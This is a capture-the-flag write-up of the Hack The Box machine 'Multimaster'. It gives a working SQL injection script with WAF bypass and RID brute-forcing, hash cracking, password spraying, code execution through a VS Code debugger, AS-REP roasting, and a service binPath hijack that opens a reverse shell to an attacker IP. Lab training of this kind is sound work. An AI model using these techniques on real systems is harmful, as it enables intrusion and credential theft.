```json
Alias: Multimaster
Date: 09-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Insane
Status: Complete
IP: 
```

# Multimaster
# Summary

- Multimaster is an insane difficulty Windows machine featuring a web application that is vulnerable to SQL Injection. This vulnerability is leveraged to obtain the foothold on the server. Examination the file system reveals that a vulnerable version of VS Code is installed, and VS Code processes and found to be running on the server. By exploiting debug functionality, a shell as the user `cyork` can be gained. A password is found in a DLL, which due to password reuse, results in a shell as `sbauer`. This user is found to have `GenericWrite` permissions on the user `jorden`. Abusing this privilege allows us to gain access to the server as this user. `jorden` is be member of `Server Operators` group, whose privileges we exploit to get a SYSTEM shell. 

---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-09 19:00 PKT
Nmap scan report for 10.129.95.200
Host is up (0.23s latency).
Not shown: 985 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-09 14:08:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2024-08-09T14:09:00+00:00; +7m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-09T14:05:18
|_Not valid after:  2054-08-09T14:05:18
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2024-08-09T14:08:45+00:00
|_ssl-date: 2024-08-09T14:09:00+00:00; +7m00s from scanner time.
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2024-08-08T14:04:36
|_Not valid after:  2025-02-07T14:04:36
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-08-09T14:08:47
|_  start_date: 2024-08-09T14:04:45
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2024-08-09T07:08:49-07:00
|_clock-skew: mean: 1h17m00s, deviation: 2h51m30s, median: 6m59s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.22 seconds
```
## Discovered Subdomains
```
MEGACORP.LOCAL
MULTIMASTER.MEGACORP.LOCAL
```

---
# Enumeration
The API at http://$IP/api/getColleagues is vulnerable to SQLi, Chars such as `', --, #'
are blocked and we get a 403 trying to access them, but we can bypass this by URL encoding the characters. So I made this python script to make life easier:

``` python
import requests
import json
import struct
import time

def valid_json(string):
    try:
        json.loads(string)
        return True
    except json.JSONDecodeError:
        return False

def unicode_encode(query):
    payload = ""
    for c in query:
        payload += r"\u{:04x}".format(ord(c))
    return payload


def union(payload):
    proxy = {'http' : "http://127.0.0.1:8081"}

    headers = {
            "Content-Type": "application/json; charset=utf-8"
            }
    
    payload = "a' union select 1, 2, 3, (" + payload + "), 5 --" 
    encoded_payload = unicode_encode(payload)
    data = f'{{"name" : "{encoded_payload}"}}'

    url = "http://10.129.247.181/api/getColleagues"

    r = requests.post(url, data=data, headers=headers, proxies=proxy)

    if r.text != 'null' and valid_json(r.text):
        r = json.loads(r.text)
        return r[0]['email']
    else:
        return r.text

def query(payload):
    proxy = {'http' : "http://127.0.0.1:8081"}

    headers = {
            "Content-Type": "application/json; charset=utf-8"
            }
    
    data = f'{{"name" : "{unicode_encode(payload)}"}}'

    url = "http://10.129.247.181/api/getColleagues"


    r = requests.post(url, data=data, headers=headers, proxies=proxy)
    print(r.text)
    r = json.loads(r.text)
    print(r[0]['email'])

```

Start it interactively and we can enumerate the stuff.

Get Tables
```
union("SELECT STRING_AGG(name, '\n') FROM Hub_db..sysobjects WHERE xtype = 'U'")

Colleagues
Logins
```

Get Columns
```
union("SELECT STRING_AGG(name, '\n') FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'logins')")

id
password
username
```

Enumerate Users
```
union("SELECT STRING_AGG(username, '\n') FROM logins")

sbauer
okent
ckane
kpage
shayna
james
cyork
rmartin
zac
jorden
alyx
ilee
nbourne
zpowers
aldom
minatotw
egre55
```

Enumerate Hashes
```
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
```

We can crack the hashes to get 3 passwords
`hashcat -m 17900 hashes.txt ~/Documents/Wordlists/rockyou.txt`

```
password1
banking1
finance1
```


Next we need to enumerate the domain through MSSQL since the password doesn't match for any of those. So I update the code with these functions to do rid bruteforce

```python
def hexstr_to_sid(hex_str):
    # Remove the '0x' prefix
    hex_str = hex_str[2:]
    
    # Convert the hex string to bytes
    sid_bytes = bytes.fromhex(hex_str)

    # Parse the SID structure
    revision = sid_bytes[0]
    sub_authority_count = sid_bytes[1]
    identifier_authority = struct.unpack('>Q', b'\x00\x00' + sid_bytes[2:8])[0]
    
    sub_authorities = []
    for i in range(sub_authority_count):
        sub_authority = struct.unpack('<I', sid_bytes[8 + i * 4: 12 + i * 4])[0]
        sub_authorities.append(sub_authority)
    
    # Format the SID string
    sid_str = f"S-{revision}-{identifier_authority}"
    for sub_authority in sub_authorities:
        sid_str += f"-{sub_authority}"
    
    return sid_str

def increment_sid(sid_str):
    sid_identifier = int(sid_str[sid_str.rfind('-')+1:]) + 1
    sid_inc = sid_str[:sid_str.rfind('-')+1]
    sid_inc += str(sid_identifier)
    return sid_inc

def rid_brute(sid, filename=None):
    file=None
    if filename:
        file = open(filename, 'w')
    start_sid = sid
    for _ in range(10000):
        time.sleep(3)
        user = union(f"SUSER_SNAME(SID_BINARY('{start_sid}'))")
        start_sid = increment_sid(start_sid)
        if user:
            print(user)
            if file:
                file.write(user + '\n')
    if file:
        file.close()

rid_brute('S-1-5-21-3167813660-1240564177-918740779-500', 'rid_users')
```

Find these users after running

```
tushikikatomo
andrew
lana
```

Do a password spray again with the previous cracked hashes, and we get:

| Username      | Password |
| ------------- | -------- |
| tushikikatomo | finance1 |

---
# Lateral Movement

## Tushikikatomo -> Cyork

We notice that a vulnerable version of vscode is running. We can connect to the port where CEF debugger is running and execute code. [cefdebug.exe](https://github.com/taviso/cefdebug) can help us do that.

first Scan ports
```powershell
./cefdebug.exe
```

Get a powershell reverse shell, I say this because the antivirus seems to be detecting nc.exe
and execute the reverse shell
```powershell
./cefdebug.exe --url ws://127.0.0.1:56106/2352b51f-75dd-4ddf-a035-df2d49b1b172 --code "process.mainModule.require('child_process').exec('powershell -c C:\\Windows\\system32\\spool\\drivers\\color\\f.ps1')"
```

## Cyork -> Sbauer

We have access to the inetpub/wwwroot directory as Cyork now. If we look at the bin folder in wwwroot we find a MultimasterAPI dll. Reverse Engineering that and looking at the ColleagueController class we find the password for the earlier DB we enumerated.

Doing a password spray will show us that the password is being used by sbauer

| Username | Password     |
| -------- | ------------ |
| Sbauer   | D3veL0pM3nT! |

## Sbauer -> Jorden

The user Sbauer has GenericWrite Access over jorden, so we can disable kerberos pre-auth for jorden get his AS-REP and crack it

Disable Pre-Auth
```
Get-ADUser -Filter 'Name -like "Jor*"' | Set-ADAccountControl -
doesnotrequirepreauth $true
```

Get AS-REP
`GetNPUsers.py megacorp.local/tushikikatomo:finance1 -dc-ip $IP -request -format hashcat -outputfile ./asrep.hash`

Crack to get jorden creds

| Username | Password      |
| -------- | ------------- |
| jorden   | rainforest786 |


---

# Privilege Escalation

Jorden is part of the very powerful Server Operators group. Members of this group have the privileges of `SeBackupPrivilege` and `SeRestorePrivilege` They also have the ability to control local service

For the privesc, type `services` and notice that the VMTools Services is running we will overwrite the path to it's executable to nc.exe and spawn a reverse shell

`sc.exe config VMTools binPath="C:\Users\jorden\t.exe -e cmd.exe 10.10.16.17 1337"`

And we will get a shell as `NT Authority\System`

---

# Flags
- 207efb86bb8e6d93267946d5008bb77e
- 93f74f491a0d1641fb8ee1f29c45a741

#CTF #CTF/Hackthebox #CTF/Hackthebox/Insane #ActiveDirectory #SQLi #SQLi/MSSQL #Reversing #ActiveDirectory/ASREPRoasting #Windows/ServerOperators 